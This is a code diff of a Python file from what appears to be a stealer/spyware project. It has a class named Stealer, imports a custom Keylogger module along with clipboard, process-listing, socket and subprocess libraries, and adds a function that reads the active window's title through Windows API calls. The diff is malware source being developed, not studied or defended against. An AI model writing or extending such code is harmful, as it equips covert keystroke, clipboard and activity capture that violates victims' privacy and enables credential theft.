@@ -2,25 +2,41 @@
 #//                                                                                        
 #!                                      import
 #//                                                                                        
-import asyncio
-import aiohttp
+try:
 
-import os
-import socket
-import psutil
-import pyperclip as clipboard
-import subprocess
-import threading
+    import asyncio
+    import aiohttp
 
-from z_logger import Keylogger
+    import os
+    import socket
+    import psutil
+    import pyperclip as clipboard
+    import subprocess
+    import threading
+    import ctypes
+    import time, sys
 
-from states import (
+    from z_logger import Keylogger
 
-    Codes,
-    Commands
-)
+    from states import (
 
-from typing import Any
+        Codes,
+        Commands
+    )
+
+    from typing import Any
+
+except ImportError as import_error:
+
+    print(import_error)
+    time.sleep(5)
+    sys.exit(1)
+
+except Exception as error:
+
+    print(error)
+    time.sleep(5)
+    sys.exit(1)
 
 #//                                                                                        
 #!                              init keylogger and blacklist
@@ -200,6 +216,17 @@ class Stealer:
 
             return ["Error"]
         
+    async def get_focused_app():
+
+        hwnd = ctypes.windll.user32.GetForegroundWindow()
+        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+        buffer = ctypes.create_unicode_buffer(length + 1)
+        ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
+
+        app_title = buffer.value if buffer.value else "No active window"
+
+        return app_title
+
     @staticmethod
     async def filter_running_apps(running_apps: list) -> list:
 
